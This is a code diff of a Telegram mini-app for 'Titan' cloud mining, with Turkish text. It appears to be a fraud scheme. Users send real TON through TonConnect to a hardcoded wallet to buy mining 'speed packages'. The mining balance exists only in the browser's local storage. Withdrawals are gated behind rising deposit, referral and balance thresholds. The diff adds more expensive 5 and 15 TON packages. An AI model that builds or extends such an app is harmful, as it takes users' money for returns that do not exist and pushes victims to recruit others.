@@ -7,19 +7,17 @@
     <script src="https://unpkg.com/@tonconnect/ui@2.0.9/dist/tonconnect-ui.min.js"></script>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        :root { --blue: #007aff; --bg: #0f172a; --card: #1e293b; --text: #f8fafc; --green: #22c55e; }
+        :root { --blue: #007aff; --bg: #0f172a; --card: #1e293b; --text: #f8fafc; --green: #22c55e; --gold: #fbbf24; }
         body { background: var(--bg); color: var(--text); font-family: sans-serif; margin: 0; padding: 0; overflow: hidden; }
         .page { display: none; height: 100vh; padding: 20px; box-sizing: border-box; overflow-y: auto; padding-bottom: 100px; }
         .page.active { display: block !important; }
         .card { background: var(--card); border-radius: 16px; padding: 20px; margin-bottom: 15px; border: 1px solid #334155; text-align: center; }
-        .btn { background: var(--blue); color: white; border: none; padding: 14px; border-radius: 12px; font-weight: bold; width: 100%; cursor: pointer; font-size: 16px; }
-        .btn:active { transform: scale(0.96); opacity: 0.9; }
+        .btn { background: var(--blue); color: white; border: none; padding: 14px; border-radius: 12px; font-weight: bold; width: 100%; cursor: pointer; font-size: 16px; transition: 0.2s; }
+        .btn:active { transform: scale(0.96); }
         .navbar { position: fixed; bottom: 0; width: 100%; height: 75px; background: var(--card); display: flex; border-top: 1px solid #334155; z-index: 100; }
         .nav-item { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; font-size: 11px; color: #94a3b8; cursor: pointer; }
         .nav-item.active { color: var(--blue); }
         .nav-item span { font-size: 22px; margin-bottom: 4px; }
-        .rule-item { text-align: left; font-size: 12px; margin-bottom: 5px; color: #94a3b8; }
-        .rule-item.done { color: var(--green); }
     </style>
 </head>
 <body>
@@ -35,23 +33,39 @@
         <div class="card">
             <div style="font-size: 50px; margin-bottom: 10px;" id="m-icon">⚡</div>
             <div style="font-size: 38px; font-weight: 800; color: var(--blue);" id="m-bal">0.00000000</div>
-            <p id="pph-text" style="color: var(--blue); font-weight: bold;">⚡ 0.512 PPH</p>
+            <p id="pph-text" style="background: rgba(0,122,255,0.1); display: inline-block; padding: 5px 15px; border-radius: 20px; color: var(--blue); font-weight: bold;">⚡ 0.512 PPH</p>
             <button id="start-btn" class="btn" style="margin-top: 15px;" onclick="startMining()">🚀 Start Mining</button>
         </div>
     </div>
 
     <div id="p-shop" class="page">
-        <h2 style="text-align:center;">Titan Market</h2>
-        <div class="card">
+        <h2 style="text-align:center; margin-bottom: 20px;">🚀 Titan Market</h2>
+        
+        <div class="card" style="border-left: 5px solid var(--green);">
             <h3>🚀 Hız Paketi V1</h3>
-            <p style="color:var(--green); font-weight:bold;">1.9 TON</p>
+            <p style="color: #94a3b8; font-size: 13px;">+0.50 PPH Artış</p>
+            <p style="font-size: 20px; color: var(--green); font-weight: bold;">1.9 TON</p>
             <button class="btn" style="background:var(--green)" onclick="buySpeed(1.9, 0.50)">Yatırım Yap</button>
+        </div>
+
+        <div class="card" style="border-left: 5px solid var(--blue);">
+            <h3>⚡ Mega Boost V2</h3>
+            <p style="color: #94a3b8; font-size: 13px;">+2.50 PPH Artış</p>
+            <p style="font-size: 20px; color: var(--blue); font-weight: bold;">5.0 TON</p>
+            <button class="btn" onclick="buySpeed(5.0, 2.50)">Yatırım Yap</button>
+        </div>
+
+        <div class="card" style="border-left: 5px solid var(--gold);">
+            <h3>👑 Ultra Titan V3</h3>
+            <p style="color: #94a3b8; font-size: 13px;">+10.00 PPH Artış</p>
+            <p style="font-size: 20px; color: var(--gold); font-weight: bold;">15.0 TON</p>
+            <button class="btn" style="background:var(--gold); color:#000;" onclick="buySpeed(15.0, 10.00)">Yatırım Yap</button>
         </div>
     </div>
 
     <div id="p-leaders" class="page">
         <h2 style="text-align:center;">Top Titans</h2>
-        <div class="card" id="ref-box">
+        <div class="card">
             <p>Referans Sayın: <b id="ref-count">0</b></p>
             <button class="btn" onclick="copyRef()">Referans Linkini Kopyala</button>
         </div>
@@ -63,11 +77,10 @@
             <h1 id="wallet-ton" style="color: var(--blue);">0.0000 💎</h1>
             <button class="btn" onclick="handleWithdraw()">📤 Para Çek</button>
         </div>
-        <div class="card">
-            <h4 style="margin-top:0;">Çekim Şartları</h4>
-            <div id="r1" class="rule-item">❌ 1. Çekim: 1.9 TON Yatırım & 1.9 TON Bakiye</div>
-            <div id="r2" class="rule-item">❌ 2. Çekim: 10 Referans & 50 TON Bakiye</div>
-            <div id="r3" class="rule-item">❌ 3. Çekim: 50 Referans & 500 TON Bakiye</div>
+        <div class="card" style="text-align: left; font-size: 12px; color: #94a3b8;">
+            <p id="r1">❌ 1. Çekim: 1.9 TON Yatırım & 1.9 TON Bakiye</p>
+            <p id="r2">❌ 2. Çekim: 10 Referans & 50 TON Bakiye</p>
+            <p id="r3">❌ 3. Çekim: 50 Referans & 500 TON Bakiye</p>
         </div>
     </div>
 
@@ -121,21 +134,22 @@
         }
 
         async function buySpeed(amt, boost) {
+            if(!tonConnectUI.connected) return Telegram.WebApp.showAlert("Önce Cüzdan Bağla!");
             const tx = { validUntil: Math.floor(Date.now()/1000)+60, messages:[{address: MY_WALLET, amount:(amt*1000000000).toString()}] };
             try {
                 await tonConnectUI.sendTransaction(tx);
                 pph += boost; hasInv = true;
                 localStorage.setItem('pph', pph); localStorage.setItem('hasInv', 'true');
-                update(); Telegram.WebApp.showAlert("Yatırım Başarılı!");
+                update(); Telegram.WebApp.showAlert("Yatırım Başarılı! Hızın Arttı.");
             } catch(e) {}
         }
 
         function handleWithdraw() {
-            if(!hasInv) return Telegram.WebApp.showAlert("Hata: Çekim için 1.9 TON yatırım gerekli!");
+            if(!hasInv) return Telegram.WebApp.showAlert("Hata: Çekim için en az 1.9 TON yatırım gerekli!");
             if(wCount == 0 && wBal >= 1.9) prc();
             else if(wCount == 1 && rCount >= 10 && wBal >= 50) prc();
             else if(wCount >= 2 && rCount >= 50 && wBal >= 500) prc();
-            else Telegram.WebApp.showAlert("Henüz çekim şartlarını sağlamıyorsun.");
+            else Telegram.WebApp.showAlert("Çekim şartlarını henüz sağlamıyorsun.");
         }
 
         function prc() {
@@ -150,13 +164,14 @@
             document.getElementById('wallet-ton').innerText = wBal.toFixed(4) + " 💎";
             document.getElementById('pph-text').innerText = "⚡ " + pph.toFixed(3) + " PPH";
             document.getElementById('ref-count').innerText = rCount;
-            if(hasInv) { document.getElementById('r1').classList.add('done'); document.getElementById('r1').innerText = "✅ 1. Çekim: Hazır"; }
+            if(hasInv) { document.getElementById('r1').style.color = "#22c55e"; document.getElementById('r1').innerText = "✅ 1. Çekim: Hazır"; }
         }
 
         function copyRef() {
             const uid = Telegram.WebApp.initDataUnsafe.user ? Telegram.WebApp.initDataUnsafe.user.id : "123";
             const link = "https://t.me/Gogircin_bot?start=" + uid;
-            navigator.clipboard.writeText(link); Telegram.WebApp.showAlert("Link Kopyalandı!");
+            const el = document.createElement('textarea'); el.value = link; document.body.appendChild(el); el.select(); document.execCommand('copy'); document.body.removeChild(el);
+            Telegram.WebApp.showAlert("Davet linkin kopyalandı!");
         }
 
         window.onload = () => { if(isMining) { isMining = false; startMining(); } update(); };
